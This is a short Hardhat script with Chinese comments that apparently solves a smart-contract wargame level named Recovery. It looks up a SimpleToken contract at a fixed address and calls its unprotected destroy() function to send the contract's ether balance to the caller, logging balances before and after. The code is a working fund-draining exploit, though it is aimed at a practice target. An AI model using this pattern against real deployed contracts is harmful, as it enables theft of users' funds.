import hre from "hardhat";
const { ethers } = hre;

// Change your target address
const SIMPLETOKEN_ADDRESS = "0xeC104fC1E3aEe786E97dD30c2bb2D9d8E89Ea1f0";

async function main() {
    const [signer] = await ethers.getSigners();
    console.log("我的帳戶地址 : ", signer.address);

    const simpleToken = await ethers.getContractAt("contracts/Recovery.sol:SimpleToken", SIMPLETOKEN_ADDRESS);
    console.log("SimpleToken 關卡實例地址: ", simpleToken.target);

    console.log("simpleToken name : ", await simpleToken.name());
    console.log("simpleToken creator balance: ", await simpleToken.balances(signer.address));

    console.log("simpleToken 合約餘額: ", await ethers.provider.getBalance(SIMPLETOKEN_ADDRESS));

    // 進攻開始
    const tx = await simpleToken.destroy(signer.address);
    const receipt = await tx.wait();

    console.log("攻擊後 simpleToken 合約餘額: ", await ethers.provider.getBalance(SIMPLETOKEN_ADDRESS));

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });